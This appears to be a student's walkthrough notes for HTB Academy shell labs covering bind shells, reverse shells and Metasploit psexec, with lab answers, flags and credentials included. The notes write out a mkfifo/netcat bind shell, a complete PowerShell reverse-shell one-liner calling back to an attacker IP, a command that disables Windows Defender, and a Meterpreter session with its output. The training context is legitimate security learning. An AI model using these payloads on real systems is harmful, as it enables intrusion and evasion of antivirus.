# Bind Shell
Target:
10.129.14.190



Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?
        443


SSH to 10.129.14.190 (ACADEMY-SHELLS-WEBSHELLS), with user "htb-student" and password "HTB_@cademy_stdnt!" 

SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.
        B1nD_Shells_r_cool
        
        SSH using credentials 
┌─[leviathan@parrot]─[~]
└──╼ $ssh htb-student@10.129.14.190
The authenticity of host '10.129.14.190 (10.129.14.190)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.14.190' (ED25519) to the list of known hosts.
htb-student@10.129.14.190's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 01 Jun 2026 09:38:59 PM UTC

  System load:             0.54
  Usage of /:              22.1% of 13.72GB
  Memory usage:            14%
  Swap usage:              0%
  Processes:               262
  Users logged in:         0
  IPv4 address for ens160: 10.129.14.190
  IPv6 address for ens160: dead:beef::a0de:adff:feda:a5e4

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

5 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Oct  8 15:31:40 2021
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb-student@ubuntu:~$ 
        start a bind shell listener
htb-student@ubuntu:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lnvp 7777 > /tmp/f
Listening on 0.0.0.0 7777

        Open a new terminal on your Parrot box and connect with netcat
┌─[leviathan@parrot]─[~]
└──╼ $nc 10.129.14.190 7777
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb-student@ubuntu:~
        
        Now read the flag
htb-student@ubuntu:~$ cat /customscripts/flag.txt
cat /customscripts/flag.txt
B1nD_Shells_r_cool
        


# Reverse Shell

Reverse Shells

With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.
Reverse Shell Example

Reverse shell setup: Target 10.10.14.20 connects back to pentester's system 10.10.14.15:1337 using netcat command.

We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected. The last section discussed how bind shells rely on incoming connections allowed through the firewall on the server-side. It will be much harder to pull this off in a real-world scenario. As seen in the image above, we are starting a listener for a reverse shell on our attack box and using some method (example: Unrestricted File Upload, Command Injection, etc..) to force the target to initiate a connection with our target box, effectively meaning our attack box becomes the server and the target becomes the client.

We don't always need to re-invent the wheel when it comes to payloads (commands & code) we intend to use when attempting to establish a reverse shell with a target. There are helpful tools that infosec veterans have put together to assist us. Reverse Shell Cheat Sheet is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators we can use when practicing or on an actual engagement. We should be mindful that many admins are aware of public repositories and open-source resources that penetration testers commonly use. They can reference these repos as part of their core considerations on what to expect from an attack and tune their security controls accordingly. In some cases, we may need to customize our attacks a bit.

Let's work hands-on with this to understand these concepts better.
Hands-on With A Simple Reverse Shell in Windows

With this walkthrough, we will be establishing a simple reverse shell using some PowerShell code on a Windows target. Let's start the target and begin.

We can start a Netcat listener on our attack box as the target spawns.
Server (attack box)

        shellsession
Leviathan516x@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443

This time around with our listener, we are binding it to a common port (443), this port usually is for HTTPS connections. We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level. It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get to various websites throughout the workday. That said, a firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port because it's examining the contents of the network packets, not just the IP address and port. Detailed firewall evasion is outside of the scope of this module, so we will only briefly touch on detection & evasion techniques throughout the module, as well as in the dedicated section at the end.

Once the Windows target has spawned, let's connect using RDP.

Netcat can be used to initiate the reverse shell on the Windows side, but we must be mindful of what applications are present on the system already. Netcat is not native to Windows systems, so it may be unreliable to count on using it as our tool on the Windows side. We will see in a later section that to use Netcat in Windows, we must transfer a Netcat binary over to a target, which can be tricky when we don't have file upload capabilities from the start. That said, it's ideal to use whatever tools are native (living off the land) to the target we are trying to gain access to.

What applications and shell languages are hosted on the target?

This is an excellent question to ask any time we are trying to establish a reverse shell. Let's use command prompt & PowerShell to establish this simple reverse shell. We can use a standard PowerShell reverse shell one-liner to illustrate this point.

On the Windows target, open a command prompt and copy & paste this command:
Client (target)

        cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Note: If we are using Pwnbox, keep in mind that some browsers do not work as seamlessly when using the Clipboard feature to paste a command directly into the CLI of a target. In these cases, we may want to paste into Notepad on the target, then copy & paste from inside the target.

Please take a close look at the command and consider what we need to change for this to allow us to establish a reverse shell with our attack box. This PowerShell code can also be called shell code or our payload. Delivering this payload onto the Windows system was pretty straightforward, considering we have complete control of the target for demonstration purposes. As this module progresses, we will notice the difficulty increases in how we deliver the payload onto targets.

What happened when we hit enter in command prompt?
Client (target)

        cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

The Windows Defender antivirus (AV) software stopped the execution of the code. This is working exactly as intended, and from a defensive perspective, this is a win. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the Virus & threat protection settings or by using this command in an administrative PowerShell console (right-click, run as admin):
Disable AV

        powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true

Once AV is disabled, attempt to execute the code again.
Server (attack box)

        shellsession
Leviathan516x@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student

Back on our attack box, we should notice that we successfully established a reverse shell. We can see this by the change in the prompt that starts with PS and our ability to interact with the OS and file system. Try running some standard Windows commands to practice a bit.

Now, let's test our knowledge with some challenge questions.

Taget:
10.129.14.200

        RDP to with user "htb-student" and password "HTB_@cademy_stdnt!" 

When establishing a reverse shell session with a target, will the target act as a client or server?
        client


Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.
        Shells-Win10

        Start a listener
nc -lnvp 8443

        Open another terminal 
ip a show tun0 | grep inet

        RPD into Target
xfreerdp3 /v:10.129.14.200 /u:htb-student /p:'HTB_@cademy_stdnt!' /cert:ignore

        CMD and Run, Replace IP with your tun0
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('**10.10.14.158**',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

        Back On Listener Terminal should see connection, and type hostname
hostname = Shells-Win10

##Automating Payloads & Delivery with Metasploit

Target:
10.129.14.220


What command language interpreter is used to establish a system shell session with the target?
        powershell


Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)
Authenticate to 10.129.14.220 (ACADEMY-SHELLS-WIN10MSF), with user "htb-student" and password "HTB_@cademy_stdnt!" 
        staffsalaries.txt

┌─[leviathan@parrot]─[~]
└──╼ $sudo nmap -sC -sV -Pn 10.129.14.220
[sudo] password for leviathan: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-01 15:57 PDT
Nmap scan report for 10.129.14.220
Host is up (0.077s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
7/tcp    open  echo
9/tcp    open  discard?
13/tcp   open  daytime      Microsoft Windows USA daytime
17/tcp   open  qotd         Windows qotd (English)
19/tcp   open  chargen
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 10 Pro 18363 microsoft-ds (workgroup: WORKGROUP)
2179/tcp open  vmrdp?
Service Info: Host: SHELLS-WIN10; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m31s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 18363 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Shells-Win10
|   NetBIOS computer name: SHELLS-WIN10\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-01T16:00:43-07:00
| smb2-time: 
|   date: 2026-06-01T23:00:42
|_  start_date: N/A

        SMB running on 445 open, search metasploit
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> search smb/psexec

Matching Modules
================

   #  Name                                         Disclosure Date  Rank    Check  Description
   -  ----                                         ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/psexec_loggedin_users  .                normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
   1  exploit/windows/smb/psexec                   1999-01-01       manual  No     Microsoft Windows Authenticated User Code Execution
   2    \_ target: Automatic                       .                .       .      .
   3    \_ target: PowerShell                      .                .       .      .
   4    \_ target: Native upload                   .                .       .      .
   5    \_ target: MOF upload                      .                .       .      .
   6    \_ target: Command                         .                .       .      .
   7  auxiliary/admin/smb/psexec_ntdsgrab          .                normal  No     PsExec NTDS.dit And SYSTEM Hive Download Utility


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/admin/smb/psexec_ntdsgrab

[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> use 1
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.41.223.206    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set rhost 10.129.14.220
rhost => 10.129.14.220
[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set smbuser htb-student
smbuser => htb-student
[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set smbpass HTB_@cademy_stdnt!
smbpass => HTB_@cademy_stdnt!
[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set lhost 10.10.14.54
lhost => 10.10.14.54
[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> run
[*] Started reverse TCP handler on 10.10.14.54:4444 
[*] 10.129.14.220:445 - Connecting to the server...
[*] 10.129.14.220:445 - Authenticating to 10.129.14.220:445 as user 'htb-student'...
[*] 10.129.14.220:445 - Selecting PowerShell target
[*] 10.129.14.220:445 - Executing the payload...
[+] 10.129.14.220:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (199238 bytes) to 10.129.14.220
[*] Meterpreter session 1 opened (10.10.14.54:4444 -> 10.129.14.220:49874) at 2026-06-01 16:31:31 -0700

(Meterpreter 1)(C:\Windows\system32) > 
(Meterpreter 1)(C:\Windows\system32) > shell
Process 6492 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18363.1854]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir c:\Users\htb-student\Documents
dir c:\Users\htb-student\Documents
 Volume in drive C has no label.
 Volume Serial Number is C41A-F2ED

 Directory of c:\Users\htb-student\Documents

10/16/2021  01:17 PM    <DIR>          .
10/16/2021  01:17 PM    <DIR>          ..
10/16/2021  01:16 PM               268 staffsalaries.txt
               1 File(s)            268 bytes
               2 Dir(s)  11,590,840,320 bytes free

C:\Windows\system32>
















